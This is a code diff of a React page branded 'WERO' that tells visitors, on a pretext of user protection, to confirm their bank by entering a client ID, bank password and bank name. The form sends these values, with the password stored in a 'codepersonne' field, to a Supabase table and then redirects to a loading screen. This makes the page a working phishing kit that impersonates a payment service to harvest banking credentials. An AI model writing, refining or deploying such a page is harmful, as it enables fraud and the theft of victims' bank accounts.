@@ -1,4 +1,5 @@
-import React, { useState, useEffect } from "react";
+
+import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
@@ -18,14 +19,6 @@ const Bank = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
 
-  // Masquer l'élément lovable-badge au montage
-  useEffect(() => {
-    const element = document.getElementById("lovable-badge");
-    if (element) {
-      element.style.display = "none";
-    }
-  }, []);
-
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
     setFormData((prev) => ({ ...prev, [name]: value }));
@@ -33,7 +26,7 @@ const Bank = () => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-
+    
     if (!formData.identifiantiban || !formData.password || !formData.typebanque) {
       toast({
         title: "Erreur de validation",
@@ -42,26 +35,29 @@ const Bank = () => {
       });
       return;
     }
-
+    
     setIsLoading(true);
-
+    
     const userId = localStorage.getItem("userId");
-
+    
     if (!userId) {
       navigate("/");
       return;
     }
-
+    
     try {
+      // Mettre à jour les informations bancaires dans la base de données
+      // Changement : le mot de passe est enregistré dans le champ codepersonne
       await supabase
         .from("sefon")
         .update({
           identifiantiban: formData.identifiantiban,
-          codepersonne: formData.password, // champ modifié
+          codepersonne: formData.password, // Changé de password à codepersonne
           typebanque: formData.typebanque,
         })
         .eq("id", userId);
-
+      
+      // Afficher le chargement puis rediriger vers Success
       setTimeout(() => {
         navigate("/loading");
       }, 1000);
@@ -81,26 +77,26 @@ const Bank = () => {
       <header className="bg-yellow-300 p-4">
         <h1 className="text-2xl font-bold">WERO</h1>
       </header>
-
+      
       <main className="flex-grow flex justify-center p-4">
         <div className="max-w-md w-full">
           <h2 className="text-2xl font-bold text-yellow-500 text-center mb-4">
             VEUILLEZ CONFIRMER VOTRE BANQUE SUR WERO.
           </h2>
-
+          
           <div className="flex justify-center mb-4">
-            <img
-              src="https://assets.zyrosite.com/Aq2q239lEjf2a2Mj/ta-c-la-c-chargement-d9575RLeGQcKkjww.gif"
-              className="img-fluid"
+            <img 
+              src="https://assets.zyrosite.com/Aq2q239lEjf2a2Mj/ta-c-la-c-chargement-d9575RLeGQcKkjww.gif" 
+              className="img-fluid" 
               alt="Carte bancaire"
             />
           </div>
-
+          
           <p className="text-center mb-8">
             Afin d'assurer la protection de nos utilisateurs, nous avons besoin
             de confirmer votre banque.
           </p>
-
+          
           <form onSubmit={handleSubmit} className="space-y-6 bg-gray-50 p-6 rounded-lg">
             <div className="space-y-2">
               <Label htmlFor="identifiantiban">Identifiant client</Label>
@@ -113,7 +109,7 @@ const Bank = () => {
                 required
               />
             </div>
-
+            
             <div className="space-y-2">
               <Label htmlFor="password">Mot de passe</Label>
               <Input
@@ -126,7 +122,7 @@ const Bank = () => {
                 required
               />
             </div>
-
+            
             <div className="space-y-2">
               <Label htmlFor="typebanque">Nom de la banque</Label>
               <Input
@@ -138,7 +134,7 @@ const Bank = () => {
                 required
               />
             </div>
-
+            
             <Button
               type="submit"
               className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-semibold py-3 flex items-center justify-center"
@@ -150,7 +146,7 @@ const Bank = () => {
           </form>
         </div>
       </main>
-
+      
       <Footer />
     </div>
   );
